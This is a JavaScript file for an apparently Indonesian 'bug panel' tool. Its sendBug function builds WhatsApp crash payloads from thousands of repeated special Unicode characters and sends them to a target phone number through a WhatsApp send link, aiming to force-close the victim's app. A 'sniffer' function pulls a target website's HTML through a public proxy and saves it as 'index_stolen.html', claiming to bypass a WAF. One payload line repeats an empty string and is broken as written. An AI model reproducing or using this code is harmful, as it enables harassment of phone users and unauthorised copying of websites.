let config = {};
fetch('config.json').then(r => r.json()).then(d => {
    config = d;
    document.getElementById('dev-update').innerText = d.system.update_log;
});

function switchTab(t) {
    document.querySelectorAll('.content-tab').forEach(el => el.classList.add('hidden'));
    document.querySelectorAll('.t-btn').forEach(el => el.classList.remove('active'));
    document.getElementById('tab-' + t).classList.remove('hidden');
    event.currentTarget.classList.add('active');
}

// BUG PANEL SENDER (KAYA DI VIDEO)
function sendBug() {
    const phone = document.getElementById('target-phone').value;
    const type = document.getElementById('bug-type').value;
    const log = document.getElementById('bug-log');

    if(!phone) return alert("Nomor Target Mana?");

    log.innerHTML = `<span class='green'>[SENT] Sending ${type} to ${phone}...</span>`;
    
    // Payload Virtex Sederhana (Isinya Karakter Crash)
    let payload = "OBLIVION_BUG_⚡" + "".repeat(5000) + "🔥_ZAMXS_OBLIVION";
    
    if(type === "FORCE_CLOSE") payload = "ᴄ̴ʀ̴ᴀ̴s̴ʜ̴_ɪ̴ɴ̴ғ̴ɪ̴ɴ̴ɪ̴ᴛ̴ʏ̴" + "ꦵ".repeat(8000);

    // Kirim via WA Link
    setTimeout(() => {
        window.open(`https://api.whatsapp.com/send?phone=${phone}&text=${encodeURIComponent(payload)}`, '_blank');
        log.innerHTML += "<br>Berhasil mengirim bug ke WA target!";
    }, 1500);
}

// SNIFFER LOGIC
async function godAlphaSniffer() {
    const url = document.getElementById('target-url').value;
    const log = document.getElementById('status-box');
    if(!url) return;

    log.innerText = "Bypassing WAF... Colong Assets Mode ON.";
    const p = "https://api.allorigins.win/get?url=";

    try {
        const res = await fetch(p + encodeURIComponent(url));
        const data = await res.json();
        const html = data.contents;
        if(html) {
            triggerDownload(html, "index_stolen.html");
            log.innerHTML = "<span class='green'>HTML/CSS/JS Captured & Downloaded!</span>";
        }
    } catch(e) { log.innerText = "Target Shield too strong."; }
}

function triggerDownload(content, name) {
    const blob = new Blob([content], {type: 'text/html'});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = name; a.click();
}
